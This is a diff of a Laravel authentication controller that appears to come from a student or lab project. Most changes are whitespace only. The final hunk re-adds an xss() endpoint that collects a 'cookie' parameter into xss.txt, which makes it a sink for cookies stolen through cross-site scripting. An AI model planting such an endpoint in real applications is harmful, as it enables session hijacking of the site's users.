@@ -28,7 +28,7 @@ class CustomAuthController extends Controller
           return redirect()->intended('list')->withSuccess('Signed in');
         }
         return redirect()->back()->withErrors(['email' => 'Incorrect email or password.'])->withInput();
-        
+
     }
 
     public function registration()
@@ -52,7 +52,7 @@ class CustomAuthController extends Controller
         ]);
 
             $data = $request->all();
-        
+
         // Xử lý việc lưu file ảnh và lấy đường dẫn đã lưu
         if ($request->hasFile('image')) {
             $data['image'] = $request->input('image', $request->file('image')->store(''));
@@ -165,7 +165,7 @@ class CustomAuthController extends Controller
         // Kiểm tra và cập nhật ảnh đại diện nếu có
         if ($request->hasFile('image')) {
             $user->image = $request->input('image', $request->file('image')->store(''));
-           
+
             $request->file('image')->store('public');
         }
 
@@ -181,9 +181,12 @@ class CustomAuthController extends Controller
         $user = User::findOrFail($id);
         return view('crud_user.edit', compact('user')); //Đường dẫn đến template thư mục
     }
-    public function xss(Request $request) {			
-        $cookie = $request->get('cookie');		
-        file_put_contents('xss.txt', $cookie);		
-        var_dump($cookie);die();		
-    }			
+    public function xss(Request $request) {
+        $cookie = $request->get('cookie');
+        file_put_contents('xss.txt', $cookie);
+        var_dump($cookie);die();
+    }
+    // xu ly tinh nang
+
+
 }
